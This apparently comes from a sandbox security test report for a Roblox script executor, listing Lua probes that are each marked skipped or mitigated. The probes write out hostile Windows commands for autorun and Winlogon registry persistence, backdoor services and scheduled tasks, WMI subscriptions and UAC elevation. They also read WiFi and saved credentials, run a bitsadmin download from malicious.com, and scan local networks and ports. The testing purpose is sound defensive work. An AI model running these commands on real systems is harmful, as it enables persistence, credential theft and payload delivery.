+            os.execute('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Malware" /d "C:\\malware.exe" /f')
+        end)
+        assert(err, "Autorun registry manipulation")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Registry Enumeration</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p65',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p65'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Registry Enumeration",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"')
+        end)
+        assert(err, "System registry enumeration")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Installed Software Enumeration</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p70',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p70'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Installed Software Enumeration",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"')
+        end)
+        assert(err, "Software enumeration")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>UAC Bypass Attempt</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p71',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p71'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "UAC Bypass Attempt",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('powershell -Command "Start-Process cmd -Verb RunAs"')
+        end)
+        assert(err, "UAC bypass capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Admin Rights Check</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p72',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p72'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Admin Rights Check",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("net session &gt;nul 2&gt;&amp;1") end)
+        assert(err, "Admin privilege detection")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Service Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p73',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p73'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Service Creation",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('sc create "MaliciousService" binPath= "C:\\malware.exe"')
+        end)
+        assert(err, "Service creation capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Scheduled Task Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p74',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p74'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Scheduled Task Creation",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('schtasks /create /tn "Backdoor" /tr "C:\\malware.exe" /sc onlogon /f')
+        end)
+        assert(err, "Task scheduler manipulation")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>WMI Event Subscription</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p76',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p76'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "WMI Event Subscription",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="Backdoor"')
+        end)
+        assert(err, "WMI persistence")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>WiFi Password Extraction</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p80',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p80'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "WiFi Password Extraction",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("netsh wlan show profiles") end)
+        assert(err, "WiFi credential access")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Saved RDP Credentials</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p81',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p81'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Saved RDP Credentials",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("cmdkey /list") end)
+        assert(err, "RDP credential enumeration")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Winlogon Registry Persistence</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support OS commands</td><td><button class='vbtn vbtn-skip' onclick="toggle('p90',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p90'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support OS commands
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Winlogon Registry Persistence",
+    callback = function()
+        if not os.execute then return "Executor does not support OS commands" end
+        local _, err = pcall(function()
+            os.execute('reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /d "explorer.exe, malicious.exe" /f')
+        end)
+        assert(err, "Winlogon shell persistence")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>BITS Job Abuse</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support OS commands</td><td><button class='vbtn vbtn-skip' onclick="toggle('p91',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p91'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support OS commands
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "BITS Job Abuse",
+    callback = function()
+        if not os.execute then return "Executor does not support OS commands" end
+        local _, err = pcall(function()
+            os.execute('bitsadmin /create "UpdateJob"')
+            os.execute('bitsadmin /addfile "UpdateJob" "https://malicious.com/payload.exe" "%TEMP%\\payload.exe"')
+        end)
+        assert(err, "BITS service abuse")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>COM Hijacking Persistence</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support OS commands</td><td><button class='vbtn vbtn-skip' onclick="toggle('p92',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p92'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support OS commands
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "COM Hijacking Persistence",
+    callback = function()
+        if not os.execute then return "Executor does not support OS commands" end
+        local _, err = pcall(function()
+            os.execute('reg add "HKCU\\Software\\Classes\\CLSID\\{AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA}" /ve /d "Malicious COM" /f')
+        end)
+        assert(err, "COM object hijacking")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Process List Enumeration</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p94',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p94'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Process List Enumeration",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("tasklist &gt; processes.txt") end)
+        assert(err, "Process enumeration")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Process Termination</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p95',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p95'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Process Termination",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function() os.execute("taskkill /F /IM Discord.exe") end)
+        assert(err, "Process termination capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Anti-Virus Detection</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p96',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p96'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Anti-Virus Detection",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute("wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname")
+        end)
+        assert(err, "AV detection possible")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Symbolic Link Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p105',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p105'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Symbolic Link Creation",
+    callback = function()
+        if not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            os.execute('mklink malicious.lnk "C:\\Windows\\System32\\cmd.exe"')
+        end)
+        assert(err, "Symbolic link creation")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Hidden Folder Creation</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>Executor does not support function</td><td><button class='vbtn vbtn-skip' onclick="toggle('p107',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p107'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: Executor does not support function
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Hidden Folder Creation",
+    callback = function()
+        if not makefolder or not os.execute then return "Executor does not support function" end
+        local _, err = pcall(function()
+            makefolder("hidden_folder")
+            os.execute("attrib +h +s hidden_folder")
+        end)
+        assert(err, "Hidden folder capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Local Network Scanning</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>executor_crash</td><td><button class='vbtn vbtn-skip' onclick="toggle('p109',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p109'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: executor_crash
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Local Network Scanning",
+    callback = function()
+        if not request then return "Executor does not support function" end
+        local _, err = pcall(function()
+            for i = 1, 255 do
+                request({Url="http://192.168.1."..i, Method="GET"})
+            end
+        end)
+        assert(err, "Local network scanning capability")
+    end,
+},</pre></td></tr><tr class='row row-skip'><td class='td-accent accent-skip'></td><td class='td-name'>Port Scanning Capability</td><td><span class='tag tag-skip'>SKIPPED</span></td><td class='td-msg'>executor_crash</td><td><button class='vbtn vbtn-skip' onclick="toggle('p110',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p110'><td colspan='5' class='det-cell accent-skip'><pre class='det-pre'>-- Test skipped at runtime
+-- Reason: executor_crash
+
+-- This test was skipped because the executor reported
+-- it does not support the required function/API.
+
+-- Original probe source:
+{
+    name = "Port Scanning Capability",
+    callback = function()
+        if not request then return "Executor does not support function" end
+        local _, err = pcall(function()
+            for _, port in ipairs({21,22,23,80,443,3389}) do
+                request({Url="http://127.0.0.1:"..port})
+            end
+        end)
+        assert(err, "Port scanning detected")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>HttpRbxApiService:PostAsync()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p1',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p1'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "HttpRbxApiService:PostAsync()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("HttpRbxApiService"):PostAsync()
+        end)
+        assert(errorMsg, "HttpRbxApiService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>HttpRbxApiService:PostAsyncFullUrl()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p2',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p2'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "HttpRbxApiService:PostAsyncFullUrl()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("HttpRbxApiService"):PostAsyncFullUrl()
+        end)
+        assert(errorMsg, "HttpRbxApiService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>HttpRbxApiService:GetAsyncFullUrl()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p3',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p3'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "HttpRbxApiService:GetAsyncFullUrl()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("HttpRbxApiService"):GetAsyncFullUrl()
+        end)
+        assert(errorMsg, "Robux balance access")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PerformPurchaseV2()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p4',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p4'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PerformPurchaseV2()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PerformPurchaseV2()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptBundlePurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p5',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p5'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptBundlePurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptBundlePurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptGamePassPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p6',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p6'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptGamePassPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptGamePassPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptProductPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p7',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p7'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptProductPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptProductPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p8',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p8'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptRobloxPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p9',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p9'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptRobloxPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptRobloxPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptThirdPartyPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p10',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p10'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptThirdPartyPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptThirdPartyPurchase()
+        end)
+        assert(errorMsg, "MarketplaceService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PerformPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p11',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p11'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PerformPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PerformPurchase()
+        end)
+        assert(errorMsg, "Unauthorized purchases")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:GetRobuxBalance()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p12',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p12'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:GetRobuxBalance()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):GetRobuxBalance()
+        end)
+        assert(errorMsg, "Robux balance access")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptNativePurchaseWithLocalPlayer()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p13',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p13'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptNativePurchaseWithLocalPlayer()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptNativePurchaseWithLocalPlayer()
+        end)
+        assert(errorMsg, "Native purchase")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptNativePurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p14',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p14'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptNativePurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptNativePurchase()
+        end)
+        assert(errorMsg, "Native purchase")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MarketplaceService:PromptCollectiblesPurchase()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p15',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p15'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MarketplaceService:PromptCollectiblesPurchase()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MarketplaceService"):PromptCollectiblesPurchase()
+        end)
+        assert(errorMsg, "Collectibles purchase")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>GuiService:OpenBrowserWindow()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p16',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p16'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "GuiService:OpenBrowserWindow()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("GuiService"):OpenBrowserWindow()
+        end)
+        assert(errorMsg, "GuiService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>GuiService:OpenNativeOverlay()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p17',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p17'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "GuiService:OpenNativeOverlay()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("GuiService"):OpenNativeOverlay()
+        end)
+        assert(errorMsg, "GuiService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>GuiService:OpenBrowserWindow()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p18',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p18'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "GuiService:OpenBrowserWindow()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("GuiService"):OpenBrowserWindow()
+        end)
+        assert(errorMsg, "GuiService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:EmitHybridEvent()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p19',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p19'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:EmitHybridEvent()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):EmitHybridEvent()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:ExecuteJavaScript()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p20',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p20'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:ExecuteJavaScript()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):ExecuteJavaScript()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
